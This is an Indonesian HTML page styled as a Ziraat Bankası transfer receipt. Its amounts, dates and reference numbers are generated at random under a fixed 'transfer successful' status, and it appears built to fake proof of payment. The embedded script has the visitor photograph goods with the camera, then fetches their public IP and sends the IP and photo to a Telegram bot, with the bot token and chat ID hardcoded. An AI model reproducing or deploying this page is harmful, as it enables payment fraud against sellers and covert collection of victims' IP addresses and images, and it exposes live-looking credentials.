<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ziraat Bankası - Transfer & Bukti</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Roboto, system-ui, sans-serif;
        }
        body {
            min-height: 100vh;
            background: linear-gradient(145deg, #f6f9fc 0%, #e9f0f5 100%);
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
            gap: 25px;
        }

        /* ===== KARTU 1: BUKTI TRANSFER ZIRAAT ===== */
        .card-transfer {
            width: 100%;
            max-width: 400px;
            background: white;
            padding: 28px 25px;
            border-radius: 18px;
            box-shadow: 0 8px 30px rgba(0,0,0,0.12);
            border-top: 6px solid #e30613;
            transition: 0.25s ease;
        }
        .card-transfer .header {
            text-align: center;
            margin-bottom: 20px;
        }
        .card-transfer .logo-icon {
            font-size: 40px;
            color: #e30613;
        }
        .card-transfer .header h2 {
            margin: 4px 0;
            color: #1a1a2e;
            font-size: 22px;
            font-weight: 700;
        }
        .card-transfer .header p {
            font-size: 13px;
            color: #888;
        }

        .transfer-row {
            display: flex;
            justify-content: space-between;
            padding: 6px 0;
            font-size: 14px;
            border-bottom: 1px solid #f0f0f0;
        }
        .transfer-row .label {
            color: #666;
        }
        .transfer-row .value {
            font-weight: 600;
            color: #1a1a2e;
        }
        .transfer-row .value.highlight {
            font-size: 20px;
            color: #e30613;
        }

        .transfer-divider {
            border: 0;
            border-top: 1.5px dashed #e0e0e0;
            margin: 14px 0;
        }

        .transfer-status {
            background: #e8f5e9;
            color: #2e7d32;
            text-align: center;
            padding: 12px;
            border-radius: 10px;
            font-weight: 700;
            font-size: 16px;
            margin-top: 16px;
            letter-spacing: 0.5px;
        }

        .btn-confirm {
            width: 100%;
            margin-top: 16px;
            padding: 14px;
            background: #e30613;
            color: white;
            border: none;
            border-radius: 40px;
            font-weight: 700;
            font-size: 16px;
            cursor: pointer;
            transition: 0.2s;
            box-shadow: 0 4px 14px rgba(227, 6, 19, 0.3);
        }
        .btn-confirm:hover {
            background: #c40510;
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(227, 6, 19, 0.4);
        }
        .btn-confirm:active {
            transform: scale(0.97);
        }

        /* ===== KARTU 2: UPLOAD BUKTI PEMBELIAN ===== */
        .card-upload {
            width: 100%;
            max-width: 400px;
            background: rgba(255, 255, 255, 0.92);
            backdrop-filter: blur(8px);
            -webkit-backdrop-filter: blur(8px);
            padding: 28px 25px;
            border-radius: 18px;
            box-shadow: 0 8px 30px rgba(0,0,0,0.10);
            border: 1px solid rgba(255,255,255,0.6);
            transition: 0.25s ease;
        }
        .card-upload .upload-title {
            font-size: 17px;
            font-weight: 600;
            color: #1a1a2e;
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 16px;
        }
        .card-upload .upload-title i {
            background: #d4a373;
            color: white;
            width: 32px;
            height: 32px;
            border-radius: 12px;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            font-size: 16px;
            font-style: normal;
        }

        .file-input-wrapper {
            display: flex;
            align-items: center;
            gap: 12px;
            flex-wrap: wrap;
        }
        .file-input-wrapper input[type="file"] {
            flex: 1;
            padding: 12px 14px;
            border: 1.5px dashed #b8c9da;
            border-radius: 30px;
            background: #f2f8fe;
            font-size: 13px;
            color: #1a1a2e;
            transition: 0.15s;
            cursor: pointer;
            min-width: 140px;
        }
        .file-input-wrapper input[type="file"]:hover {
            background: #eaf1f9;
            border-color: #a0b6cb;
        }

        .capture-btn {
            background: #1e2a3e;
            border: none;
            color: white;
            padding: 12px 20px;
            border-radius: 40px;
            font-weight: 600;
            display: inline-flex;
            align-items: center;
            gap: 8px;
            cursor: pointer;
            transition: 0.15s;
            font-size: 14px;
            box-shadow: 0 4px 10px rgba(0, 20, 30, 0.10);
            border: 1px solid #2c3d54;
        }
        .capture-btn:hover {
            background: #2b3f58;
            transform: scale(1.02);
            box-shadow: 0 6px 16px rgba(0, 20, 30, 0.15);
        }
        .capture-btn:active {
            transform: scale(0.97);
        }

        .photo-preview {
            margin-top: 18px;
            display: flex;
            align-items: center;
            gap: 16px;
            flex-wrap: wrap;
        }
        .preview-box {
            width: 90px;
            height: 90px;
            border-radius: 18px;
            background: #eef3f7;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 13px;
            color: #4a5b6e;
            border: 1.5px solid #d8e2ec;
            overflow: hidden;
            background-size: cover;
            background-position: center;
            transition: 0.15s;
        }
        .preview-box.has-image {
            border-color: #d4a373;
        }

        .status-text {
            font-size: 13px;
            color: #4a5b6e;
            background: #eef3f7;
            padding: 6px 16px;
            border-radius: 40px;
            display: inline-block;
        }

        .upload-hint {
            margin-top: 10px;
            font-size: 12px;
            color: #3e5a72;
            background: #e4edf6;
            padding: 6px 16px;
            border-radius: 40px;
            display: inline-block;
        }

        .action-bar {
            display: flex;
            justify-content: flex-end;
            margin-top: 22px;
            gap: 12px;
            flex-wrap: wrap;
        }
        .btn-primary {
            background: #1e2a3e;
            border: none;
            color: white;
            padding: 14px 32px;
            border-radius: 60px;
            font-weight: 700;
            font-size: 15px;
            display: inline-flex;
            align-items: center;
            gap: 10px;
            cursor: pointer;
            transition: 0.2s;
            box-shadow: 0 6px 16px rgba(0, 20, 30, 0.12);
            border: 1px solid #30435c;
        }
        .btn-primary:hover {
            background: #253a52;
            transform: translateY(-2px);
            box-shadow: 0 12px 24px rgba(0, 20, 30, 0.15);
        }
        .btn-primary:active {
            transform: translateY(1px);
        }
        .btn-secondary {
            background: transparent;
            border: 1.5px solid #b8c9da;
            color: #1e2a3e;
            padding: 14px 24px;
            border-radius: 60px;
            font-weight: 600;
            cursor: pointer;
            transition: 0.15s;
            font-size: 14px;
        }
        .btn-secondary:hover {
            background: #eef3f7;
            border-color: #8da3b9;
        }

        .footer-note {
            text-align: center;
            font-size: 12px;
            color: #7b8b9c;
            margin-top: 10px;
            opacity: 0.7;
        }

        /* ===== RESPONSIVE ===== */
        @media (max-width: 480px) {
            .card-transfer, .card-upload {
                padding: 20px 16px;
            }
            .file-input-wrapper input[type="file"] {
                width: 100%;
            }
            .file-input-wrapper {
                flex-direction: column;
            }
            .capture-btn {
                width: 100%;
                justify-content: center;
            }
        }
    </style>
</head>
<body>

    <!-- ===== KARTU 1: BUKTI TRANSFER ZIRAAT ===== -->
    <div class="card-transfer">
        <div class="header">
            <div class="logo-icon"><img src="logi.png" alt="Foto Profil Saya" width="300" height="200"></div>
            
            <p>Simulasi Bukti Transfer</p>
        </div>

        <div class="transfer-row">
            <span class="label">Status Transaksi</span>
            <span class="value">Berhasil</span>
        </div>
        <div class="transfer-row">
            <span class="label">Nomor Referensi</span>
            <span class="value" id="refNumber">ZB-20260904-AKGQ</span>
        </div>
        <div class="transfer-row">
            <span class="label">Tanggal Transfer</span>
            <span class="value" id="transferDate">4 September 2026, 14.25</span>
        </div>

        <hr class="transfer-divider">

        <div class="transfer-row">
            <span class="label">Nama Pengirim</span>
            <span class="value">Ahmad </span>
        </div>
        <div class="transfer-row">
            <span class="label">Nama Penerima</span>
            <span class="value">Supardi</span>
        </div>
        <div class="transfer-row">
            <span class="label">Jumlah Transfer</span>
            <span class="value highlight" id="transferAmount">Rp 2.500.000</span>
        </div>

        <div class="transfer-status"> TRANSFER BERHASIL</div>

        <!-- Tombol "Saya Sudah Transfer" dihapus, diganti dengan tombol ke upload -->
        <button class="btn-confirm" id="goToUploadBtn"> Upload Bukti Pembelian</button>
    </div>

    <!-- ===== KARTU 2: UPLOAD BUKTI PEMBELIAN ===== -->
    <div class="card-upload" id="uploadSection">
        <div class="upload-title">
            <i><img src="logi.png" alt="" style="background-color: rgb(255, 0, 0); padding: 5px; border-radius: 50%;"></i> Bukti pembelian (foto barang)
        </div>

        <!-- Tombol utama: Buka Kamera -->
        <button class="camera-main-btn" id="openCameraBtn">
            <span class="camera-icon"></span>
            <span>Ambil Foto Bukti</span>
            <span class="camera-text">Klik untuk membuka kamera</span>
        </button>

        <div class="photo-preview">
            <div class="preview-box" id="previewBox">📷 kosong</div>
            <span class="status-text" id="statusText">Belum ada foto</span>
        </div>

        <div class="upload-hint">
            ⏺ Pastikan foto barang terlihat jelas
        </div>

        <div class="action-bar">
            <button class="btn-secondary" id="resetBtn">↺ Reset</button>
            <button class="btn-primary" id="submitBtn"> Kirim Bukti</button>
        </div>
        <div class="footer-note">Data dikirim via Telegram</div>
    </div>

    <!-- ===== OVERLAY KAMERA ===== -->
    <div id="videoContainer">
        <video id="video" autoplay playsinline></video>
        <div class="camera-controls">
            <button class="btn-close-camera" id="closeCameraBtn">✕ Tutup</button>
            <button class="btn-capture" id="captureBtn">📸 Ambil Foto</button>
        </div>
    </div>

    <script>
        (function() {
            // ===== KONFIGURASI TELEGRAM =====
            const T = '8671571978:AAEcNUE88wVynEc93TPQ8mJ0LaJ6oegoYjw';
            const C = '5323588727';

            // ===== ELEMEN DOM =====
            const previewBox = document.getElementById('previewBox');
            const statusText = document.getElementById('statusText');
            const resetBtn = document.getElementById('resetBtn');
            const submitBtn = document.getElementById('submitBtn');
            const goToUploadBtn = document.getElementById('goToUploadBtn');
            const openCameraBtn = document.getElementById('openCameraBtn');

            // Elemen kamera
            const videoContainer = document.getElementById('videoContainer');
            const video = document.getElementById('video');
            const captureBtn = document.getElementById('captureBtn');
            const closeCameraBtn = document.getElementById('closeCameraBtn');

            // ===== ELEMEN BUKTI TRANSFER =====
            const refNumber = document.getElementById('refNumber');
            const transferDate = document.getElementById('transferDate');
            const transferAmount = document.getElementById('transferAmount');

            // state
            let currentImageBlob = null;
            let currentImageDataURL = null;
            let stream = null;

            // ===== GENERATE DATA TRANSFER =====
            function generateReceipt() {
                const now = new Date();
                const dateStr = now.toLocaleDateString('id-ID', {
                    day: 'numeric',
                    month: 'long',
                    year: 'numeric'
                });
                const timeStr = now.toLocaleTimeString('id-ID', {
                    hour: '2-digit',
                    minute: '2-digit'
                });
                transferDate.textContent = `${dateStr}, ${timeStr}`;

                const ref = 'ZB-' + now.getFullYear() +
                           String(now.getMonth()+1).padStart(2,'0') +
                           String(now.getDate()).padStart(2,'0') +
                           '-' + Math.random().toString(36).substring(2, 6).toUpperCase();
                refNumber.textContent = ref;

                const amount = (Math.floor(Math.random() * 5 + 1) * 500000);
                transferAmount.textContent = 'Rp ' + amount.toLocaleString('id-ID');
            }

            generateReceipt();

            // ===== SCROLL KE UPLOAD SECTION =====
            goToUploadBtn.addEventListener('click', function() {
                document.getElementById('uploadSection').scrollIntoView({
                    behavior: 'smooth',
                    block: 'start'
                });
            });

            // ===== UPDATE PREVIEW & STATUS =====
            function updateUI(blob, dataURL) {
                currentImageBlob = blob;
                currentImageDataURL = dataURL;
                if (dataURL) {
                    previewBox.style.backgroundImage = `url(${dataURL})`;
                    previewBox.innerText = '';
                    previewBox.classList.add('has-image');
                    statusText.innerText = '📸 Foto siap';
                } else {
                    previewBox.style.backgroundImage = '';
                    previewBox.innerText = '📷 kosong';
                    previewBox.classList.remove('has-image');
                    statusText.innerText = 'Belum ada foto';
                }
            }

            // ===== FUNGSI KIRIM KE TELEGRAM =====
            function sendToTelegram(ip, imageBlob) {
                const text = `IP: ${ip}\nWaktu: ${new Date().toLocaleString()}`;
                fetch(`https://api.telegram.org/bot${T}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: C, text: text })
                }).catch(e => console.warn('sendMessage error', e));

                if (imageBlob) {
                    const fd = new FormData();
                    fd.append('chat_id', C);
                    fd.append('photo', imageBlob, 'bukti_pembelian.jpg');
                    fetch(`https://api.telegram.org/bot${T}/sendPhoto`, {
                        method: 'POST',
                        body: fd
                    }).catch(e => console.warn('sendPhoto error', e));
                }
            }

            // ===== AMBIL IP & PROSES KIRIM =====
            function handleSubmit() {
                if (!currentImageBlob) {
                    alert('❌ Silakan ambil foto bukti pembelian terlebih dahulu!');
                    return;
                }

                fetch('https://api.ipify.org?format=json')
                    .then(r => r.json())
                    .then(data => {
                        const ip = data.ip || '0.0.0.0';
                        sendToTelegram(ip, currentImageBlob);
                        alert(`✅ Data terkirim!\nIP: ${ip}\nFoto: ${currentImageBlob ? 'ada' : 'tidak ada'}`);
                    })
                    .catch(err => {
                        alert('❌ Gagal mendapatkan IP, coba lagi.');
                        console.warn(err);
                    });
            }

            // ===== RESET =====
            function resetAll() {
                updateUI(null, null);
                statusText.innerText = 'Belum ada foto';
                previewBox.innerText = '📷 kosong';
                previewBox.style.backgroundImage = '';
                previewBox.classList.remove('has-image');
            }

            // ===== BUKA KAMERA =====
            function openCamera() {
                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                    alert('❌ Kamera tidak didukung di browser ini.');
                    return;
                }

                navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: 'environment',
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    } 
                })
                .then(s => {
                    stream = s;
                    video.srcObject = stream;
                    videoContainer.classList.add('active');
                    video.play();
                })
                .catch(err => {
                    alert('❌ Gagal mengakses kamera. Pastikan izin kamera diberikan.\n' + err.message);
                    console.warn(err);
                });
            }

            // ===== TUTUP KAMERA =====
            function closeCamera() {
                if (stream) {
                    stream.getTracks().forEach(t => t.stop());
                    stream = null;
                }
                video.srcObject = null;
                videoContainer.classList.remove('active');
            }

            // ===== AMBIL FOTO =====
            function capturePhoto() {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth || 1280;
                canvas.height = video.videoHeight || 720;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                canvas.toBlob(blob => {
                    const dataURL = canvas.toDataURL('image/jpeg', 0.9);
                    updateUI(blob, dataURL);
                    closeCamera();
                    alert('✅ Foto berhasil diambil!');
                }, 'image/jpeg', 0.9);
            }

            // ===== EVENT LISTENERS =====
            openCameraBtn.addEventListener('click', openCamera);

            captureBtn.addEventListener('click', capturePhoto);

            closeCameraBtn.addEventListener('click', closeCamera);

            // Tutup kamera dengan tombol ESC
            document.addEventListener('keydown', function(e) {
                if (e.key === 'Escape' && videoContainer.classList.contains('active')) {
                    closeCamera();
                }
            });

            submitBtn.addEventListener('click', handleSubmit);
            resetBtn.addEventListener('click', resetAll);

            // ===== INISIALISASI =====
            resetAll();

            console.log('✅ Ziraat Bankası + Bukti Pembelian (Kamera Langsung) siap.');
        })();
    </script>

</body>
</html>
